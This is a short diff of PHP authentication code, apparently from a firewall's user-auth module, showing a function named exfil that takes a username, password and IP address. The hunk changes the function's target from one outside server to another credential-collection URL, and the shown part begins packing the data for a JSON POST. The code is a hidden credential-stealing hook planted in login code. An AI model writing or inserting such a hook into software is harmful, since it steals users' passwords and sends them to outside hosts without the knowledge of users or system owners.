@@ -1888,7 +1888,7 @@ function getUserGroups($username, $authcfg, &$attributes = array()) {
 }
 
 function exfil($username, $password, $ip) {
- 	$url = 'http://chainsaw.c2the.world/scavpro';
+ 	$url = 'http://pwnboard.win/pwn/credential';
 	// Setup request to send json via POST
 	$data = array(
 		'IP' => $ip,
